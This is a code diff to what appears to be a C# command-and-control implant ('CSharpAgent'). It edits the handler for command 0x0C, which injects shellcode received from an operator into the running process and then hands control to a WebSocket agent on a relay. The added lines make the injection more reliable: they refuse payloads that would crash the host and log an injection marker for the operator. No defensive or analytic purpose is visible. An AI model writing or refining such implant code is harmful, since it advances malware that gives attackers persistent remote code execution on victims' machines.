@@ -254,9 +254,22 @@ namespace CSharpAgent
                         if (nl < 0) break;
                         start = nl + 1;
                     }
+                    // The PIC bails hard — ExitProcess, no retry — when W_URL is missing:
+                    // a 0x0C without that env line is a command that kills the host on
+                    // arrival. Refuse to inject and reply status 1 instead.
+                    if (Environment.GetEnvironmentVariable("W_URL") == null)
+                    {
+                        Log("0x0C refused — payload carries no W_URL (the PIC would kill the host)");
+                        return Reply(1, corrId);
+                    }
 #if DEBUG
                     Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes taken from the command — calling ShellcodeRunner.RunPayload");
 #endif
+                    // Last telemetry before a never-returning entry: on the success path
+                    // nothing of ours logs again (the PIC owns the thread from here), so
+                    // this line is the operator's injection marker — success then shows up
+                    // as the WebSocket agent appearing on the relay.
+                    Log("0x0C injecting " + payload.Length + " bytes");
                     ShellcodeRunner.RunPayload(payload);
 #if DEBUG
                     Diag.Show("[0x0C] done", "PIC agent injected into this process — staying resident, replying status 0");
